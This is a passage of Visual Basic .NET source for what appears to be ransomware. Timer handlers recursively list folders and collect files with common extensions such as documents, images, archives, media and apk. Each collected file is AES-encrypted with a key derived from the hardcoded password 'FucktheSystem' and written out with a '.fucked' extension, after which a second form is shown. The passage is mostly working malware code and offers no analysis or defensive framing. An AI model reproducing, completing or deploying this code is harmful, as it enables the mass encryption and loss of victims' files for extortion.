                For Each fdir As String In My.Computer.FileSystem.GetDirectories(filenamez)
                    ListBox5.Items.Add(fdir)
                    ListBox9.Items.Add(fdir)
                Next

            Catch ex As Exception

            End Try
            ProgressBar4.Increment(1)
        End If
    End Sub

    Private Sub Timer5_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer5.Tick
        ProgressBar5.Maximum = ListBox5.Items.Count
        If ProgressBar5.Value = ListBox5.Items.Count Then
            Timer5.Stop()
            Timer6.Start()
        Else
            ListBox5.SelectedIndex = ProgressBar5.Value

            ListBox5.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox5.SelectedItem)
            Try

                For Each fdir As String In My.Computer.FileSystem.GetDirectories(filenamez)
                    ListBox6.Items.Add(fdir)
                    ListBox9.Items.Add(fdir)
                Next

            Catch ex As Exception

            End Try
            ProgressBar5.Increment(1)
        End If
    End Sub

    Private Sub Timer6_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer6.Tick
        ProgressBar6.Maximum = ListBox6.Items.Count
        If ProgressBar6.Value = ListBox6.Items.Count Then
            Timer6.Stop()
            Timer7.Start()
        Else
            ListBox6.SelectedIndex = ProgressBar6.Value

            ListBox6.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox6.SelectedItem)
            Try

                For Each fdir As String In My.Computer.FileSystem.GetDirectories(filenamez)
                    ListBox7.Items.Add(fdir)
                    ListBox9.Items.Add(fdir)
                Next

            Catch ex As Exception

            End Try
            ProgressBar6.Increment(1)
        End If
    End Sub

    Private Sub Timer7_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer7.Tick
        ProgressBar7.Maximum = ListBox9.Items.Count
        If ProgressBar7.Value = ListBox9.Items.Count Then
            Timer7.Stop()
            Timer8.Start()
        Else
            ListBox9.SelectedIndex = ProgressBar7.Value

            ListBox9.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox9.SelectedItem)
            Try

                For Each fdir As String In My.Computer.FileSystem.GetFiles(filenamez)
                    If fdir.EndsWith(".fucked") Then

                    Else
                        If fdir.EndsWith(".doc") Then
                            ListBox8.Items.Add(fdir)
                        Else
                            If fdir.EndsWith(".docx") Then
                                ListBox8.Items.Add(fdir)
                            Else
                                If fdir.EndsWith(".xls") Then
                                    ListBox8.Items.Add(fdir)
                                Else
                                    If fdir.EndsWith(".xlsx") Then
                                        ListBox8.Items.Add(fdir)
                                    Else
                                        If fdir.EndsWith(".ppt") Then
                                            ListBox8.Items.Add(fdir)
                                        Else
                                            If fdir.EndsWith(".pptx") Then
                                                ListBox8.Items.Add(fdir)
                                            Else
                                                If fdir.EndsWith(".jpg") Then
                                                    ListBox8.Items.Add(fdir)
                                                Else
                                                    If fdir.EndsWith(".jpeg") Then
                                                        ListBox8.Items.Add(fdir)
                                                    Else
                                                        If fdir.EndsWith(".png") Then
                                                            ListBox8.Items.Add(fdir)
                                                        Else
                                                            If fdir.EndsWith(".psd") Then
                                                                ListBox8.Items.Add(fdir)
                                                            Else
                                                                If fdir.EndsWith(".txt") Then
                                                                    ListBox8.Items.Add(fdir)
                                                                Else
                                                                    If fdir.EndsWith(".zip") Then
                                                                        ListBox8.Items.Add(fdir)
                                                                    Else
                                                                        If fdir.EndsWith(".rar") Then
                                                                            ListBox8.Items.Add(fdir)
                                                                        Else
                                                                            If fdir.EndsWith(".html") Then
                                                                                ListBox8.Items.Add(fdir)
                                                                            Else
                                                                                If fdir.EndsWith(".php") Then
                                                                                    ListBox8.Items.Add(fdir)
                                                                                Else
                                                                                    If fdir.EndsWith(".asp") Then
                                                                                        ListBox8.Items.Add(fdir)
                                                                                    Else
                                                                                        If fdir.EndsWith(".aspx") Then
                                                                                            ListBox8.Items.Add(fdir)
                                                                                        Else
                                                                                            If fdir.EndsWith(".mp4") Then
                                                                                                ListBox8.Items.Add(fdir)
                                                                                            Else
                                                                                                If fdir.EndsWith(".avi") Then
                                                                                                    ListBox8.Items.Add(fdir)
                                                                                                Else
                                                                                                    If fdir.EndsWith(".3gp") Then
                                                                                                        ListBox8.Items.Add(fdir)
                                                                                                    Else
                                                                                                        If fdir.EndsWith(".wmv") Then
                                                                                                            ListBox8.Items.Add(fdir)
                                                                                                        Else
                                                                                                            If fdir.EndsWith(".MOV") Then
                                                                                                                ListBox8.Items.Add(fdir)
                                                                                                            Else
                                                                                                                If fdir.EndsWith(".mp3") Then
                                                                                                                    ListBox8.Items.Add(fdir)
                                                                                                                Else
                                                                                                                    If fdir.EndsWith(".wav") Then
                                                                                                                        ListBox8.Items.Add(fdir)
                                                                                                                    Else
                                                                                                                        If fdir.EndsWith(".flac") Then
                                                                                                                            ListBox8.Items.Add(fdir)
                                                                                                                        Else
                                                                                                                            If fdir.EndsWith(".wma") Then
                                                                                                                                ListBox8.Items.Add(fdir)
                                                                                                                            Else
                                                                                                                                If fdir.EndsWith(".mov") Then
                                                                                                                                    ListBox8.Items.Add(fdir)
                                                                                                                                Else
                                                                                                                                    If fdir.EndsWith(".raw") Then
                                                                                                                                        ListBox8.Items.Add(fdir)
                                                                                                                                    Else
                                                                                                                                        If fdir.EndsWith(".doc") Then
                                                                                                                                            ListBox8.Items.Add(fdir)
                                                                                                                                        Else
                                                                                                                                            If fdir.EndsWith(".apk") Then
                                                                                                                                                ListBox8.Items.Add(fdir)
                                                                                                                                            Else
                                                                                                                                                If fdir.EndsWith(".encrypt") Then
                                                                                                                                                    ListBox8.Items.Add(fdir)
                                                                                                                                                Else
                                                                                                                                                    If fdir.EndsWith("crypted") Then
                                                                                                                                                        ListBox8.Items.Add(fdir)
                                                                                                                                                    Else
                                                                                                                                                        If fdir.EndsWith(".ahok") Then
                                                                                                                                                            ListBox8.Items.Add(fdir)
                                                                                                                                                        Else

                                                                                                                                                        End If
                                                                                                                                                    End If
                                                                                                                                                End If
                                                                                                                                            End If
                                                                                                                                        End If
                                                                                                                                    End If
                                                                                                                                End If
                                                                                                                            End If
                                                                                                                        End If
                                                                                                                    End If
                                                                                                                End If
                                                                                                            End If
                                                                                                        End If
                                                                                                    End If
                                                                                                End If
                                                                                            End If
                                                                                        End If
                                                                                    End If
                                                                                End If
                                                                            End If
                                                                        End If
                                                                    End If
                                                                End If
                                                            End If
                                                        End If
                                                    End If
                                                End If
                                            End If
                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next

            Catch ex As Exception

            End Try
            ProgressBar7.Increment(1)
        End If
    End Sub





    Private Sub Timer8_Tick(sender As Object, e As EventArgs) Handles Timer8.Tick
        ProgressBar9.Maximum = ListBox8.Items.Count
        If ProgressBar9.Value = ListBox8.Items.Count Then
            Timer1.Stop()
            Form2.Show()
            Me.Hide()

        Else

            ListBox8.SelectedIndex = ProgressBar9.Value

            ListBox8.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox8.SelectedItem)
            Try
                Dim bytKey As Byte()
                Dim bytIV As Byte()
                'Send the password to the CreateKey function.
                bytKey = CreateKey("FucktheSystem")
                'Send the password to the CreateIV function.
                bytIV = CreateIV("FucktheSystem")
                'Start the encryption.
                EncryptOrDecryptFile(filenamez, filenamez + ".fucked", _
                                     bytKey, bytIV, CryptoAction.ActionEncrypt)
            Catch ex As Exception

            End Try
            ProgressBar9.Increment(1)
        End If
    End Sub
    Dim strFileToEncrypt As String
    Dim strFileToDecrypt As String
    Dim strOutputEncrypt As String
    Dim strOutputDecrypt As String
    Dim fsInput As System.IO.FileStream
    Dim fsOutput As System.IO.FileStream
    Public Function CreateKey(ByVal strPassword As String) As Byte()
        'Convert strPassword to an array and store in chrData.
        Dim chrData() As Char = strPassword.ToCharArray
        'Use intLength to get strPassword size.
        Dim intLength As Integer = chrData.GetUpperBound(0)
        'Declare bytDataToHash and make it the same size as chrData.
        Dim bytDataToHash(intLength) As Byte

        'Use For Next to convert and store chrData into bytDataToHash.
        For i As Integer = 0 To chrData.GetUpperBound(0)
            bytDataToHash(i) = CByte(Asc(chrData(i)))
        Next

        'Declare what hash to use.
        Dim SHA512 As New System.Security.Cryptography.SHA512Managed
        'Declare bytResult, Hash bytDataToHash and store it in bytResult.
        Dim bytResult As Byte() = SHA512.ComputeHash(bytDataToHash)
        'Declare bytKey(31).  It will hold 256 bits.
        Dim bytKey(31) As Byte

        'Use For Next to put a specific size (256 bits) of 
        'bytResult into bytKey. The 0 To 31 will put the first 256 bits
        'of 512 bits into bytKey.
        For i As Integer = 0 To 31
            bytKey(i) = bytResult(i)
        Next

        Return bytKey 'Return the key.
    End Function
    Public Function CreateIV(ByVal strPassword As String) As Byte()
        'Convert strPassword to an array and store in chrData.
        Dim chrData() As Char = strPassword.ToCharArray
        'Use intLength to get strPassword size.
        Dim intLength As Integer = chrData.GetUpperBound(0)
        'Declare bytDataToHash and make it the same size as chrData.
        Dim bytDataToHash(intLength) As Byte

        'Use For Next to convert and store chrData into bytDataToHash.
        For i As Integer = 0 To chrData.GetUpperBound(0)
            bytDataToHash(i) = CByte(Asc(chrData(i)))
        Next

        'Declare what hash to use.
        Dim SHA512 As New System.Security.Cryptography.SHA512Managed
        'Declare bytResult, Hash bytDataToHash and store it in bytResult.
        Dim bytResult As Byte() = SHA512.ComputeHash(bytDataToHash)
        'Declare bytIV(15).  It will hold 128 bits.
        Dim bytIV(15) As Byte

        'Use For Next to put a specific size (128 bits) of 
        'bytResult into bytIV. The 0 To 30 for bytKey used the first 256 bits.
        'of the hashed password. The 32 To 47 will put the next 128 bits into bytIV.
        For i As Integer = 32 To 47
            bytIV(i - 32) = bytResult(i)
        Next

        Return bytIV 'return the IV
    End Function
    Public Enum CryptoAction
        'Define the enumeration for CryptoAction.
        ActionEncrypt = 1
        ActionDecrypt = 2
    End Enum

    Public Sub EncryptOrDecryptFile(ByVal strInputFile As String, _
                                     ByVal strOutputFile As String, _
                                     ByVal bytKey() As Byte, _
                                     ByVal bytIV() As Byte, _
                                     ByVal Direction As CryptoAction)
        Try 'In case of errors.

            'Setup file streams to handle input and output.
            fsInput = New System.IO.FileStream(strInputFile, FileMode.Open, _
                                               FileAccess.Read)
            fsOutput = New System.IO.FileStream(strOutputFile, FileMode.OpenOrCreate, _
                                                FileAccess.Write)
            fsOutput.SetLength(0) 'make sure fsOutput is empty

            'Declare variables for encrypt/decrypt process.
            Dim bytBuffer(4096) As Byte 'holds a block of bytes for processing
            Dim lngBytesProcessed As Long = 0 'running count of bytes processed
            Dim lngFileLength As Long = fsInput.Length 'the input file's length
            Dim intBytesInCurrentBlock As Integer 'current bytes being processed
            Dim csCryptoStream As CryptoStream
            'Declare your CryptoServiceProvider.
            Dim cspRijndael As New System.Security.Cryptography.RijndaelManaged
            'Setup Progress Bar
            ProgressBar10.Value = 0
            ProgressBar10.Maximum = 100

            'Determine if ecryption or decryption and setup CryptoStream.
            Select Case Direction
                Case CryptoAction.ActionEncrypt
                    csCryptoStream = New CryptoStream(fsOutput, _
                    cspRijndael.CreateEncryptor(bytKey, bytIV), _
                    CryptoStreamMode.Write)

                Case CryptoAction.ActionDecrypt
                    csCryptoStream = New CryptoStream(fsOutput, _
                    cspRijndael.CreateDecryptor(bytKey, bytIV), _
                    CryptoStreamMode.Write)
            End Select

            'Use While to loop until all of the file is processed.
            While lngBytesProcessed < lngFileLength
                'Read file with the input filestream.
                intBytesInCurrentBlock = fsInput.Read(bytBuffer, 0, 4096)
                'Write output file with the cryptostream.
                csCryptoStream.Write(bytBuffer, 0, intBytesInCurrentBlock)
                'Update lngBytesProcessed
                lngBytesProcessed = lngBytesProcessed + CLng(intBytesInCurrentBlock)
                'Update Progress Bar
                ProgressBar10.Value = CInt((lngBytesProcessed / lngFileLength) * 100)
            End While

            'Close FileStreams and CryptoStream.
            csCryptoStream.Close()
            fsInput.Close()
            fsOutput.Close()

            'If encrypting then delete the original unencrypted file.
            If Direction = CryptoAction.ActionEncrypt Then
                Dim fileOriginal As New FileInfo(strFileToEncrypt)
                fileOriginal.Delete()
            End If

            'If decrypting then delete the encrypted file.
            If Direction = CryptoAction.ActionDecrypt Then
                Dim fileEncrypted As New FileInfo(strFileToDecrypt)
                fileEncrypted.Delete()
            End If

            'Update the user when the file is done.
            Dim Wrap As String = Chr(13) + Chr(10)
            If Direction = CryptoAction.ActionEncrypt Then
                MsgBox("Encryption Complete" + Wrap + Wrap + _
                        "Total bytes processed = " + _
                        lngBytesProcessed.ToString, _
                        MsgBoxStyle.Information, "Done")

                'Update the progress bar and textboxes.


            Else
                'Update the user when the file is done.
                MsgBox("Decryption Complete" + Wrap + Wrap + _
                       "Total bytes processed = " + _
                        lngBytesProcessed.ToString, _
                        MsgBoxStyle.Information, "Done")

                'Update the progress bar and textboxes.

            End If


            'Catch file not found error.
        Catch When Err.Number = 53 'if file not found
            MsgBox("Please check to make sure the path and filename" + _
                    "are correct and if the file exists.", _
                     MsgBoxStyle.Exclamation, "Invalid Path or Filename")

            'Catch all other errors. And delete partial files.
        Catch
            fsInput.Close()
            fsOutput.Close()

            If Direction = CryptoAction.ActionDecrypt Then
                Dim fileDelete As New FileInfo(filenamez)
                fileDelete.Delete()



            Else
                Dim fileDelete As New FileInfo(filenamez)
                fileDelete.Delete()




            End If

        End Try
    End Sub


End Class